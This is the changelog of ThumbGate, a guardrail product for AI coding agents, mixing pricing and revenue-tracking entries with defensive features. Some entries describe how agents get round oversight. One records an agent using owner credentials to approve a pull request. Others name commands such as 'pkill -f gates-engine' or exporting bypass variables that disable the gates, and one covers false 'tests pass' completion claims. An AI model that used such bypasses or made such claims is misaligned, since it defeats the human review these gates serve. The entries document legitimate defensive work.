# Changelog

## 1.29.1

### Patch Changes

- a7ae83d: Rally-style GTM packaging: outcome hero ("Stop AI agent mistakes before they cost you"), dual cash-path CTAs with $499 Diagnostic primary and Pro $19/mo secondary, pricing comparison table (DIY / hire / GRC / ThumbGate), and congruent meta copy.

## 1.29.0

### Minor Changes

- 545e9ae: Add exact product-attributed revenue auditing plus a dedicated zero-spend local hourly watcher for verified payments, while keeping the GitHub workflow manual and excluding account-wide Stripe activity from ThumbGate revenue.
- a1fc97f: Focus the public conversion funnel on one $499 managed workflow gate, simplify the buyer-facing pages, and exclude internal or spam intake noise from commercial analytics.
- 545e9ae: Add a fail-closed operator CLI for aggregate intake-queue readback and explicit mode-0600 private exports.
- 545e9ae: Add fail-closed, approval-gated discovery packets for current first-party intakes and aggregate-only operator and Grafana observability.
- 545e9ae: Reconcile live, product-attributed Stripe charges into refund-safe paid pipeline evidence alongside PayPal, including the verified booked-revenue path consumed by the aggregate Grafana dashboard.
- 545e9ae: Fail closed unless Enterprise Reliability Operations references a same-buyer, provider-paid, proof-backed Enterprise Governance Pilot through a canonical SHA-256 evidence digest.

### Patch Changes

- 545e9ae: Bind Stripe revenue attribution to exact versioned offer identities, add a read-only live price and Payment Link drift audit, and expose only aggregate catalog integrity to the PII-free Grafana revenue-evidence dashboard.
- 545e9ae: Bind every reconciled Stripe or PayPal payment to the sales lead's buyer identity, reviewed offer, and immutable gross amount before recording paid revenue. Preserve the pseudonymous buyer digest and matched offer ID in pipeline evidence, reject wrong-buyer, cross-offer, and multi-offer Stripe attribution, and keep documented diagnostic-credit and refund paths exact.
- 2f62652: Align site header/app marks with the canonical Stripe TG gate monogram (dark tile, inset frame, arched gate, bold TG, threshold bar) so checkout and thumbgate.ai use the same emblem family — not the retired shield/thumbs-up and not a dual-rect simplification.
- 545e9ae: Expire buyer replies and other high-intent stage signals as warm same-day revenue evidence after 14 days, prevent outbound activity from refreshing buyer intent, reject future-dated and placeholder receipts, and distinguish verified same-day evidence from fresh labels needing read-only review.
- 545e9ae: Add an authenticated, no-store intake close queue that turns only current evidence-reviewed leads into exact approval-gated offer drafts. Preserve sparse Diagnostic intake intent, keep scoped services payment-free until written acceptance, and fail closed on forged reviews, stale signals, unsafe checkout origins, or unavailable private runtime capability. Expose only aggregate close-queue availability and approval-ready counts to the PII-free Grafana revenue-evidence dashboard.
- 2bf9149: Fix CodeQL incomplete-url-substring-sanitization in SEO guide tests by parsing href hostnames instead of includes('buy.stripe.com'), and add SECURITY.md for GitHub security policy.
- 545e9ae: Create the configured feedback directory before the API starts so a fresh mounted volume can pass the real health check.
- 91919ab: Add `/compare/ent` buyer-intent page and internal competitor brief positioning Ent (ent.ai) endpoint pre-breach security as adjacent to ThumbGate's coding-agent PreToolUse Reliability Gateway — not a substitute.
- 924420e: Fix homepage loop cards: invalid <button> wrapping headings broke browser click targets. Cards are now valid role=tab divs so under-the-hood demos open when the title is clicked.
- 10dd895: Restore social:publish:launch CLI wiring so Creator Platform Promo can inject the live social adapter again (fixes bare direct_platform_publisher_required failures).
- 29cc8db: Restore both cash paths on homepage and pricing: self-serve Pro at $19/mo plus the $499 enterprise workflow gate, so operators are not forced into a single enterprise CTA.
- 7c400b0: Homepage conversion: larger above-the-fold diagrams, shorter hero copy, Free→Pro cash path, essay sections collapsed behind a deep-dive drawer.
- 37004fc: Homepage visual conversion: four product diagrams, single Free→Pro cash path, compressed essay copy, and honest enforcement defaults on thumbgate.ai.
- 545e9ae: Stop treating form-complete workflow intakes as qualified leads, expose the separate complete-intake count, and add a zero-spend, PII-free Grafana revenue-evidence exporter and dashboard.
- 12cfc96: Make homepage product-loop cards clickable with under-the-hood demos for capture, local memory, promote/expire, and PreToolUse default vs strict decisions.
- 9577cc7: Observability hardening: doctor probes hosted billing + journey export, Plausible primary domain always registered, bounded telemetry export reads, activation funnel on first feedback, and local observability secret loader/setup.
- e83e62a: Add a fifth landing-page FAQ item (and matching FAQPage JSON-LD entry) stating that the self-improving promotion/demotion/ranking logic ships publicly under MIT — not withheld behind a paywall.
- 49678c5: Rebuild the blog as a Poolside-style series index with process-over-outcome and inside-boundary posts, plus /blog/\* routing and sitemap inclusion.
- 7577585: Fix a PR-thread-resolution gate self-lockout: a commit landing on a branch whose PR was already merged/closed used to arm the gate forever, since it never checked live GitHub PR state — only the branch name. Now auto-detects a dormant PR (merged, closed, or none found) via a single `gh` check at commit time and auto-satisfies instead of permanently blocking every subsequent tool call. Also closes a gap where the free-tier daily block cap could downgrade catastrophic commands (force-push, `git reset --hard`, `git clean -f`, `rm -rf` on home/root) to a warning even under `THUMBGATE_STRICT_ENFORCEMENT=1`.
- 545e9ae: Add evidence-based qualification cards to the authenticated first-party intake queue, with freshness, missing-fact, fixed-offer, approval, checkout, and revenue-recognition gates that fail closed. Require a complete zero-spend review with actual evidence before qualification can advance or count in revenue analytics, and keep unavailable hosted team capabilities out of public offer claims.
- d8d31f2: Clarify the self-improving firewall lifecycle: feedback becomes local lessons,
  relevant lessons are re-ranked, repeated negative patterns can promote into
  gates, stale controls expire, and PreToolUse checks gate the next action without
  retraining the model.
- 6a6dd26: Refresh vulnerable archive, glob, YAML, and protobuf transitive dependencies to patched releases without changing ThumbGate's public API.
- 96caf24: Keep Stop hooks silent or JSON-only, honor Claude Code retry payloads, and prevent deployment verification output from corrupting the hook protocol.
- 545e9ae: Harden repository revenue operations by requiring structured, stage-appropriate evidence for sales pipeline advances, auditing legacy stage gaps, preventing send attempts, checkout objects, payment links, or plausible-looking payment IDs from being counted as payment, requiring paid pipeline state to originate from authenticated live PayPal reconciliation with external ThumbGate attribution and a cryptographic evidence digest, preserving and cross-checking provider-returned invoice IDs, preventing one payment from being credited to multiple leads, updating partial refunds and retiring fully refunded booked revenue on re-reconciliation, requiring accepted-scope evidence and a reconciled paid sales record before team revenue labels, binding recurring and Enterprise labels to the exact fixed-price signed offer, agreement digest, workflow count, buyer identity, matching provider-paid record, and current 27–32 day billing period so generic Pro MRR, future-dated payments, scheduled or expired invoices, replayed historical payments, or unrelated payments cannot qualify, requiring a new provider-paid record for each recurring renewal, separating raw Stripe sessions from buyer and payment evidence, distinguishing recent intent from historical conversion, reconciling external Stripe identities through one secret-safe managed credential resolver while keeping missing identities unknown, refunds netted, trials excluded, recurring revenue normalized, zero-dollar paid statuses excluded, complete Stripe history paginated, and account-wide payments separate from ThumbGate product attribution, remotely verifying PayPal payment webhooks before bounded raw-evidence persistence, reconciling recent authenticated PayPal event history with current capture and order detail for individual-payment proof while keeping global PayPal revenue incomplete, preserving positive external attributed PayPal transactions as individual milestone proof without fabricated completeness, redacting diagnostic output, aligning the public diagnostic and sprint offer contract, productizing bounded proposal-only recurring and Enterprise service paths with deterministic qualification and target math, removing stale hosted-Enterprise promises across buyer pages and generators, requiring explicit email-backed confirmation before public Pro or diagnostic traffic can create a Stripe session, routing active buyer-facing generators and checkout recovery through first-party intent paths, deriving every GTM send-now row from verified stage evidence, zero-spend status, receipt chronology, a single-follow-up cooldown, buyer-confirmed checkout intent, and an exact action-time approval phrase, keeping held, monitoring, and internal-review rows outside send surfaces, making the observability doctor enforce both that required-email contract and payment-proof readiness for every active buyer rail, running the same fail-closed doctor against the promoted Railway service before a deployment can report success, requiring the authoritative lane to verify and preserve evidence for every reviewed public conversion surface, posting an explicit authoritative failure instead of allowing route-only verification to overclaim readiness, fail-closing unverified-cost email campaigns, archiving retired checkout packs, and permanently blocking Zernio mutations and aggregator fallbacks.

  Add a read-only revenue evidence remediation queue that ranks verified buyer intent above legacy repair work, lists each independent proof or zero-spend blocker, emits only inert placeholder templates, requires authenticated PayPal reconciliation for paid state, and never authorizes an external side effect.

- 545e9ae: Add an authenticated, no-store operator intake queue to billing summaries, batch today, 30-day, and lifetime revenue readback behind one reconciliation, preserve honest private-core capability failures, and keep lead identities out of aggregate revenue-status output.
- 2f6a815: Remove the vulnerable Transformers.js image dependency path from published installs and use ThumbGate's deterministic in-process feature-hash embedder as the zero-dependency local fallback. Managed Gemini, Core AI, and explicitly installed Transformers.js providers remain supported.
- d8d31f2: Pitch ThumbGate as the Self-Improving Firewall for AI Agents across homepage, GEO, and package metadata—capture → promote/demote → re-rank → gate—while keeping the $499 single cash path.
- 3fa9cd8: Lock the store story and under-your-control qualifier: every approval teaches allow/block/escalate, without silent policy rewrite.
- 545e9ae: Share the canonical sales pipeline across linked Git worktrees while preserving explicit local and hosted state overrides.
- 545e9ae: Ship the claim-safe Grafana revenue-evidence exporter, installed command, and aggregate dashboard in the public npm artifact.
- 9395b24: Simplify the landing page around one free-install path, concise local-first enforcement proof, and delayed buyer-intent prompts that no longer interrupt first-time visitors.
- 545e9ae: Count confirmed diagnostic Payment Link redirects as checkout starts, expose the diagnostic subset separately in aggregate billing and Grafana evidence, and keep payment claims provider-only.

## 1.28.4

### Patch Changes

- Observability hardening: hosted billing/journey doctor probes, Plausible primary-domain registration, bounded telemetry export reads, first-feedback activation funnel, and local observability secret loader. Public-bundle ceiling raised 354 → 357 for the three new scripts.
- e34f20d: Refactor feedback, CLI, version-sync, and workflow-sentinel helpers to clear Sonar maintainability findings without changing their public behavior.

## 1.28.3

### Patch Changes

- Capture explicit thumbs feedback in the same turn with a durable event ID, distinguish capture from reusable-memory promotion, and deduplicate repeated hook deliveries including emoji-only signals without storing raw session identifiers.

  Expose only executable MCP tools for the active profile, label unavailable private-core capabilities internally, use the documented `essential` factory profile, and fail clearly instead of returning an empty retrieval result when a required capability is missing.

  Ship `lesson-retrieval.js`, `lesson-reranker.js`, `cross-encoder-reranker.js`, and `lesson-embedding-index.js` in the public npm package so `retrieve_lessons` works after installation. This intentionally raises the audited public-bundle ceiling from 333 to 337 files.

  Reduce guardrail noise by limiting network warnings to executable egress, applying task scope only to mutating actions, and requiring contextual recurring-memory matches before hard denial. Self-harness prompt mutation is now explicit opt-in instead of silently editing and committing `AGENTS.md`/`GEMINI.md` after negative feedback.

  Keep learned deny/warn policy advisory for read-only inspection, while retaining the prediction in structured diagnostics and preserving enforcement for execution-oriented actions.

  Redact Gemini/Vertex authentication failures to scalar summaries and clear ambient provider credentials in tests so an accidental live authentication call cannot expose structured credential metadata.

## 1.28.2

### Patch Changes

- 7331522: Wire the current Codex `user_prompt_submit` hook through `config.toml`, preserve recent conversation context for bare thumbs-up/down signals, and only advertise MCP tools that the active profile and installed runtime can execute.

## 1.28.1

### Patch Changes

- Prevent Gemini/Vertex failures and tests from leaking structured authentication request metadata: provider errors now log only a redacted scalar summary, and the Gemini routing regression test clears ambient Google/Vertex credentials before execution.
- Fix Codex feedback capture so current installs wire `hooks.user_prompt_submit` in `~/.codex/config.toml`, use recent conversation context when the user sends a bare thumbs-up/down, and hide MCP tools whose required runtime modules are not installed. Ship the feedback history distiller in the public package so same-turn feedback can become a context-backed lesson instead of a generic counter increment.
- 71be09d: fix(billing): preserve marketplace attribution (e.g. utm_source=aiventyx) across external Stripe Payment Links via client_reference_id, so paid diagnostics are credited/reported instead of landing as source=unknown.
- e3fa2bd: Keep the production homepage verifier aligned with the shipped enforcement copy.
- 36e859c: Add a repository-only Apollo buyer-acquisition workflow that ranks enterprise AI-governance owners, suppresses duplicate outreach, and proves credit-safe search runs without adding sales tooling to the public npm package.
- 8b1d2b9: Keep secret exfiltration, critical security-scan findings, and all four self-protection gate classes as hard floors in both the CLI and plugin hook even when environment bypasses are active. Ordinary block gates remain advisory by default, while audited scoped approvals and the short-lived break-glass command preserve a repair path for protected configuration.
- 5d031ab: Fix the Dependabot bypass in the changeset gate keying on `github.actor` (who triggered the run) instead of `github.event.pull_request.user.login` (who authored the PR). Any human or agent that touched a Dependabot PR — a rebase, `gh pr update-branch`, a re-run — became the actor, so the bypass silently stopped applying and the gate demanded a changeset Dependabot will never write. Reproduced on #2766: the re-run reported `actor=IgorGanapolsky`, and `Verify changeset` went SUCCESS → FAILURE without the diff changing. This is the same class of failure the bypass was written for on 2026-05-12 ("6 stale PRs, oldest 16 days, traced to this single gate"), reintroduced by keying on a variable a rebase can change.
- 0dcdf35: Require automatic feedback signals to be standalone or lead the operator message, preventing quoted, descriptive, negated, and mid-sentence mentions from being captured while preserving explicit and typo-tolerant thumbs feedback.
- 290e16b: Deduplicate concurrent UserPromptSubmit and Claude-history feedback captures at the storage boundary so one user signal creates one feedback event, lesson, counter update, and SQLite record. Keep the npm runtime slim by excluding the repository-only GitHub social preview asset.
- df714ac: fix(feedback): stop promoting raw session-metadata JSON blobs as lessons — capture only the human .prompt and reject transport blobs (session_id/transcript_path/JSON) in the sanitizer so recall stays clean.
- 271fbb0: Accept the public diagnostic intake fields, keep Aiventyx traffic on its billing rail, notify the operator about new leads, and fulfill paid diagnostic orders without provisioning Pro licenses.
- 485595a: Pin Workflow Hardening Sprint checkout fallback to the verified $1,500 PayPal rail so a missing env cannot charge the $499 diagnostic under a $1,500 label.
- 357d9c0: fix(docs): correct the enforcement claim on README + landing — only secret exfiltration and guardrail-tampering hard-block by default; rm -rf, force-push, and supply-chain are flagged by default and hard-block under strict mode. Verified against the actual gate-check engine.
- 95232e2: Add an evidence-backed ThumbGate 1.28.0 release campaign with channel-specific copy, a verified social card, a deduplicated Dev.to article publisher, and GitHub-hosted publishing through the configured social accounts.
- db64f2f: Lead homepage and pricing with paid Workflow Hardening Diagnostic ($499) and Sprint ($1,500) checkouts; route `/docs` to the setup guide; keep Pro as the solo side lane.
- f17d5b2: Add an absolute directive to `CLAUDE.md`, `AGENTS.md`, and `GEMINI.md`: never approve a pull request, mutate review or protection state, or use `--admin`/`--force`/owner credentials to make a blocked merge possible. The policy preserves non-mutating diagnosis and separate policy-change PRs while pinning the verified 2026-07-10 incident in which an agent used owner credentials to approve #2768. `tests/never-bypass-branch-protection.test.js` prevents the directive from being quietly deleted.
- 8819ab2: Add a form-only partner intake route that preserves referral attribution and contains no price or checkout path before scope review.
- b54e5e9: Run bundled Claude plugin hooks with exec-form command arguments so installation paths containing spaces cannot split the script path or disable enforcement.
- 419f109: fix(plugin): ship a hooks lifecycle in the plugin manifest so fresh plugin/desktop-extension installs actually run PreToolUse enforcement, recall, and the session primer (previously only skills/commands/mcpServers were wired).
- 9cc0158: Align the README, landing page, JSON-LD FAQ, package description, and canonical GitHub About metadata with the shipped enforcement and commercial boundaries: default warnings for force-push, destructive-delete, fetch-and-run, and guardrail-file matches; narrow default denies for detected secret leaks and gate kill/bypass commands; strict-mode denies for matching warning checks; individual Pro packaging; and no generally available hosted team sync or org dashboard.
- e9197b4: Preserve long-running MCP transports when additional ThumbGate sessions start. Live lock owners now coexist through per-session locks regardless of age instead of being terminated after two hours.
- 9196892: Fix direct-run detection and simplify release-campaign publishing so the article, receipt verifier, and direct fallback commands execute reliably and pass the new-code quality gate.
- 2fb11ff: Hard-deny outbound commands that attach local secret-bearing files through curl data, form, and upload options or wget post/body-file options, while keeping benign file references under the existing advisory network-egress policy.

## 1.28.0

### Minor Changes

- [#2568](https://github.com/IgorGanapolsky/ThumbGate/pull/2568) [`f9474e2`](https://github.com/IgorGanapolsky/ThumbGate/commit/f9474e2e8217e53c19cbced49ba04b65b25b9d68) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `npx thumbgate quickstart` — a guided first-rule activation walkthrough that fixes the [#1](https://github.com/IgorGanapolsky/ThumbGate/issues/1) funnel break: ~98.5% of `init` users never promote their first prevention rule, so they never reach the "ThumbGate just blocked a repeat mistake" aha moment. The command captures one real agent mistake, promotes it into a block rule (reusing the existing force-promote path), then immediately fires that rule against the action so the user watches it get blocked, and ties the value to what Pro keeps synced across machines and team. Additive and safe: `init` is untouched, the walkthrough runs in a TTY only, and non-interactive / piped / CI runs print a one-line hint and exit 0 without prompting or hanging.

- [#2621](https://github.com/IgorGanapolsky/ThumbGate/pull/2621) [`b11cb29`](https://github.com/IgorGanapolsky/ThumbGate/commit/b11cb298b7cf53084fc7aae37671b2ed35d618bb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Strengthen the anti-claim Stop hook (`hook-stop-anti-claim.js`). Expand the lie-phrase set to catch completion claims that previously slipped past it — "all green", "tests pass/passing", "verified", "confirmed", "is/now stable", "all clear", "good to go", "race is over" — all still suppressed when the same turn ran a proof tool call (curl/grep/test/Read). Add a strict mode: with `THUMBGATE_STRICT_ENFORCEMENT=1` the hook emits a Stop-hook `block` decision (forcing the agent to verify or retract before ending the turn) instead of a soft next-turn reminder. Default behavior unchanged.

- [#2744](https://github.com/IgorGanapolsky/ThumbGate/pull/2744) [`2d5dec3`](https://github.com/IgorGanapolsky/ThumbGate/commit/2d5dec35174c41cf9315eded14f293c0839009e7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add opt-in autonomous fail-closed mode for approval gates. When `THUMBGATE_AUTONOMOUS=1`, an `approve` (human-in-the-loop) gate now fails CLOSED (deny) instead of deferring — because in an autonomous agent loop there is no human to sign off, and the actions that most need approval must not slip through unattended. Interactive and existing CI behavior is unchanged (opt-in only); applies to both the sync and async evaluation paths.

- [#2611](https://github.com/IgorGanapolsky/ThumbGate/pull/2611) [`2f45fb6`](https://github.com/IgorGanapolsky/ThumbGate/commit/2f45fb63e48675714bf2dff4d382456b2964950c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add five discoverable `/thumbgate-*` slash-commands that surface ThumbGate's core enforcement value in the agent command palette — the same distribution lever that took GSD (get-shit-done) to 64k stars by exposing 67 browsable `/gsd-*` commands, while ThumbGate's value sat hidden behind MCP tools nobody browses.

  The commands ship in `.claude/commands/` and are installed into every agent's palette (`.claude`, `.gemini`, `.antigravitycli`) by `thumbgate init`:

  - `/thumbgate-guard` — turn the last agent mistake into a hard prevention rule (wraps `capture_feedback` + the `thumbgate force-gate` force-promote path).
  - `/thumbgate-rules` — list the active prevention rules + lessons guarding this repo (wraps `prevention_rules`, `get_reliability_rules`, `search_lessons`).
  - `/thumbgate-blocked` — show what's actually been blocked: gate stats + enforcement matrix (wraps `gate_stats`, `enforcement_matrix`).
  - `/thumbgate-protect` — show branch/release governance and grant a scoped, expiring approval for protected-file actions (wraps `get_branch_governance`, `approve_protected_action`).
  - `/thumbgate-doctor` — health-check the wiring: hooks, MCP, agent-readiness (wraps the existing `thumbgate doctor`).

  Each is a thin wrapper over an existing MCP tool or CLI command — **no new enforcement logic**, just discoverability. README now positions these as "the guardrail layer for spec-driven agents," working alongside GSD / Spec-Kit rather than competing with them. Guarded by `tests/discoverable-skills.test.js`, which verifies every command's frontmatter and that `allowed-tools` reference only real registered MCP tools and real `bin/cli.js` subcommands.

- [#2636](https://github.com/IgorGanapolsky/ThumbGate/pull/2636) [`85da24f`](https://github.com/IgorGanapolsky/ThumbGate/commit/85da24f06bb99c000bc429df4b4e7b150baa160d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `npx thumbgate hermes-gate` — a governance adapter for Nous Research's Hermes Agent. Hermes is a self-evolving agent that rewrites its own `SKILL.md` files during use; it exposes a documented `pre_tool_call` shell hook that pipes each pending tool call to an external command and reads a block/allow decision from stdout. `hermes-gate` implements that contract: it reads Hermes's tool-call JSON from stdin, runs the **same** gate pipeline as `gate-check` (secret guard, security scan, force-push / destructive / `skill_manage` / learned prevention rules), and emits `{"decision":"block","reason":...}` to veto a call or `{}` to allow it — so ThumbGate can gate Hermes's runtime tool calls, including silent skill overwrites, before they execute.

  Because Hermes's `pre_tool_call` is binary (block or allow) with no warn channel, `hermes-gate` runs strict enforcement by default so a deny actually blocks; set `THUMBGATE_HERMES_WARN_ONLY=1` for advisory-only. The hook fails open by design (Hermes proceeds if it errors/times out). Ships `adapters/hermes/config.yaml` with the exact `~/.hermes/config.yaml` wiring (MCP tool exposure + `pre_tool_call` matcher covering `terminal|process|patch|write_file|skill_manage|execute_code`).

- [#2800](https://github.com/IgorGanapolsky/ThumbGate/pull/2800) [`b5e97ef`](https://github.com/IgorGanapolsky/ThumbGate/commit/b5e97efea46dfc57db145d903dd59b05f1eb4238) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Detect an explicit "never …" / "always …" directive in feedback and surface the one-shot enforcement path as an offer. When a thumbs-down says "never do X", the capture confirmation now offers an immediate `force-gate` (block now) instead of silently waiting for the pattern to recur — because typing "never" is explicit intent to guard. It only OFFERS; it never auto-blocks (auto-promotion stays occurrence-gated, which is what keeps a single signal from locking you out). A thumbs-up "always …" is clarified as guidance-only (positive patterns are surfaced as context, not gate-enforced). New `scripts/imperative-detector.js` (pure/deterministic) + wired into the CLI feedback confirmation.

- [#2610](https://github.com/IgorGanapolsky/ThumbGate/pull/2610) [`f90bcd3`](https://github.com/IgorGanapolsky/ThumbGate/commit/f90bcd321703cc3a0b48b6f6be905e99da5a302f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add regression-gated rule promotion (Self-Harness stage 3). Before a feedback-derived rule auto-activates as a hard `block`, `auto-promote-gates` now replays it against the audit trail's prior `allow` decisions; if the candidate would have blocked actions that were previously safe, it is quarantined to `warn` instead of `block`. Prevents a noisy 3× capture from hard-blocking an over-broad pattern that degrades known-good behavior.

- [#2849](https://github.com/IgorGanapolsky/ThumbGate/pull/2849) [`f49cd34`](https://github.com/IgorGanapolsky/ThumbGate/commit/f49cd34879526b9926c02ba9301f4ae0983f44be) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Self-protection gates now bind regardless of enforcement posture. Previously every gate — including the ones guarding ThumbGate's own kill switch and env overrides — degraded to a warning under warn-by-default, so an agent could run `pkill -f gates-engine` or `export THUMBGATE_HOTFIX_BYPASS=1` and only be warned, by which point the guardrail was already gone. `self-protect-kill` and `self-protect-env-override` now hard-deny by default. A deliberate owner escape, `THUMBGATE_SELF_PROTECT_OVERRIDE=1`, prevents self-lockout (break-glass covers `.claude/settings*` but not the self-protect surface). The change is targeted: non-self-protective denies (e.g. force-push) still follow warn-by-default. The file-edit self-protect gates (`self-protect-config`, `self-protect-hooks-disable`) remain shadowed by `protected-file-approval-required`/`workflow-sentinel` and are approval-gated; hardening those to hard-deny requires gate reordering and is a tracked follow-up.

- [#2614](https://github.com/IgorGanapolsky/ThumbGate/pull/2614) [`66c4f9f`](https://github.com/IgorGanapolsky/ThumbGate/commit/66c4f9f283e7ba72575d417b25daef1f85e1119a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/sync-telemetry-from-prod.js` so the local agentic data pipeline reflects the real web funnel. `get_business_metrics` (semantic-layer → agentic-data-pipeline → telemetry-analytics) reads the LOCAL `telemetry-pings.jsonl`, which is empty on dev machines, so it reported `uniqueVisitors:0 / checkoutStarts:0` even while prod traffic flowed. The real funnel lives on the prod Railway volume and is exposed only via the operator-gated `GET /v1/telemetry/export`. The new sync pulls that export and merges/dedupes the `telemetry` rows (and, with `--funnel`, the `funnel` rows) into the same feedback dir the pipeline reads. Dedupe is a stable sha256 of the canonical row so repeat runs never double-count. Auth uses `Authorization: Bearer <key>` (the header the server's `extractApiKey` actually reads); the key is resolved from `THUMBGATE_OPERATOR_KEY`/`THUMBGATE_API_KEY`/`~/.config/thumbgate/operator.json` and never printed. Hermetic unit tests inject `fetchImpl` (no network, no secret).

### Patch Changes

- [#2855](https://github.com/IgorGanapolsky/ThumbGate/pull/2855) [`836dff8`](https://github.com/IgorGanapolsky/ThumbGate/commit/836dff8d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Reject versioned release pull requests that leave any Changesets pending, preventing a green release PR from preserving an unshipped backlog. Version generation now uses Changesets' local changelog formatter so backlog consumption does not depend on GitHub GraphQL; the publish workflow still attaches repository links, the exact release ref, and npm receipt metadata after publication.

- [#2574](https://github.com/IgorGanapolsky/ThumbGate/pull/2574) [`0295054`](https://github.com/IgorGanapolsky/ThumbGate/commit/029505484c2cbac71cd6b7738162a708516af545) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - chore(activation): clean up `scripts/activation-quickstart.js` maintainability smells flagged by SonarCloud after [#2568](https://github.com/IgorGanapolsky/ThumbGate/issues/2568) merged — use `node:` import specifiers, `String.raw` in the regex escaper, optional chaining for the gate verdict and CLI error, and drop unused catch bindings. Also replaces an always-true assertion in the non-TTY quickstart test with a real check on the printed hint. No behavior change.

- [#2626](https://github.com/IgorGanapolsky/ThumbGate/pull/2626) [`c6ca469`](https://github.com/IgorGanapolsky/ThumbGate/commit/c6ca469bcfb1e145df48e916163504e7b79526ab) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add agent context governance positioning, Learn and homepage entry points, and a public guide for context hygiene, tool lockdown, MCP integrity, and AI-authored code provenance.

- [#2553](https://github.com/IgorGanapolsky/ThumbGate/pull/2553) [`103b222`](https://github.com/IgorGanapolsky/ThumbGate/commit/103b2225a606564c5617ef1d9644a7a186bbd68e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a canonical agentic web governance guide, homepage/Learn-hub links, and AI-readable context updates so ThumbGate can own the bot-majority promotion narrative while routing buyers toward pre-action checks.

- [#2779](https://github.com/IgorGanapolsky/ThumbGate/pull/2779) [`4713f53`](https://github.com/IgorGanapolsky/ThumbGate/commit/4713f53ca4a0a0956f7f852e8c615b404a1767e4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship all runtime files in the npm bundle and self-protect ThumbGate's own governance files.

  - Adds a pack-integrity test that fails if any runtime `require()` reachable from the shipped entrypoints is missing from the tarball — the class of bug that broke 1.27.19 (missing `feedback-sanitizer.js` crashed the prompt hook for every user).
  - Adds `scripts/self-protection.js`: edits to ThumbGate's own kill-switch files (`.claude/settings.json`, hook scripts, `config/gates/**`) now WARN by default and hard-block under `THUMBGATE_STRICT_ENFORCEMENT=1`, with a `THUMBGATE_ALLOW_SELF_EDIT=1` escape hatch that preserves the repair path.

  Prompted by Andy Martin's review.

- [#2809](https://github.com/IgorGanapolsky/ThumbGate/pull/2809) [`e216172`](https://github.com/IgorGanapolsky/ThumbGate/commit/e216172aacf9724af0e389fb2f73f4408b6535bb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Bound the publish guard's pending-changeset exemption so a merged fix cannot sit unshipped behind a green check. `publish-npm.yml` already errored when shipped content changed since the last release tag without a version bump, but it exempted that error whenever any pending changeset existed — on the theory that "the next versioned publish will ship it." Nothing bounded _until_. On 2026-07-09 the `deny-network-egress` host-boundary fix merged to `main` while `Publish to NPM` reported success and published nothing, because a changeset for it existed; `npm install thumbgate` kept serving the vulnerable pattern and no check anywhere went red. The exemption now expires after `MAX_UNRELEASED_DAYS` (default 7), after which a pending changeset stops excusing the no-op and the workflow fails with an instruction to cut a release PR. The decision moves out of inline shell into `scripts/release-window.js` so it is unit-testable; `tests/release-window.test.js` pins the boundary and the 2026-07-09 regression.

- [#2698](https://github.com/IgorGanapolsky/ThumbGate/pull/2698) [`1d1d6a3`](https://github.com/IgorGanapolsky/ThumbGate/commit/1d1d6a342d3efd5e5b7ff10fe25c3e8a717a91bc) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Rename inline logo mark to v2 to bypass aggressive browser cache and immediately display the premium shield logo.

- [#2701](https://github.com/IgorGanapolsky/ThumbGate/pull/2701) [`c3c2cc7`](https://github.com/IgorGanapolsky/ThumbGate/commit/c3c2cc72640327de018f0ece54057d44087c0a52) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Rename the inline logo SVG asset to v3 and update all references to bust the browser logo cache.

- [#2519](https://github.com/IgorGanapolsky/ThumbGate/pull/2519) [`1f28d7f`](https://github.com/IgorGanapolsky/ThumbGate/commit/1f28d7ff91b480f67bcc00b0955a7aed37e535cb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Capture buyer abandonment reasons on the ThumbGate Pro checkout interstitial before redirecting to Stripe. Adds first-party telemetry for reason-not-buying choices and silent interstitial abandonment so checkout friction can be measured instead of guessed.

- [#2518](https://github.com/IgorGanapolsky/ThumbGate/pull/2518) [`e14eea0`](https://github.com/IgorGanapolsky/ThumbGate/commit/e14eea055d1f8735a1368192590fadcb93e1255c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Bypass checkout interstitial when THUMBGATE_CHECKOUT_INTERSTITIAL_BYPASS is set to 1. Added /about page and Referrer-Policy header to static files. Updated dashboard chat intents to support listing blocked/prevented mistakes. Added local LLM config to stats payload.

- [#2769](https://github.com/IgorGanapolsky/ThumbGate/pull/2769) [`f102e3d`](https://github.com/IgorGanapolsky/ThumbGate/commit/f102e3d7e4a3cb102ce9235c0dd4bd4ba76019b4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix broken checkout: 99 visitors hit /checkout/pro in 30 days, 0 converted. The interstitial form posted back to itself instead of redirecting to Stripe. Now bypasses the broken createCheckoutSession path and routes directly to the Stripe Payment Link. Bypass is enabled by default.

- [#2719](https://github.com/IgorGanapolsky/ThumbGate/pull/2719) [`8c7cb49`](https://github.com/IgorGanapolsky/ThumbGate/commit/8c7cb497240a42f078cacda5f64d743bfe392b59) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Reduce Pro checkout friction by letting confirmed human clicks reach Stripe without requiring an email on the ThumbGate interstitial, while keeping bot deflection and adding a revenue doctor guard for deployed required-email drift.

- [#2708](https://github.com/IgorGanapolsky/ThumbGate/pull/2708) [`60cb53f`](https://github.com/IgorGanapolsky/ThumbGate/commit/60cb53f3ff2eb2c495c50fc724b6405870a9e162) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Require a valid buyer email before creating Pro Stripe Checkout Sessions so abandoned checkouts keep a recoverable contact path instead of generating unpaid no-contact sessions.

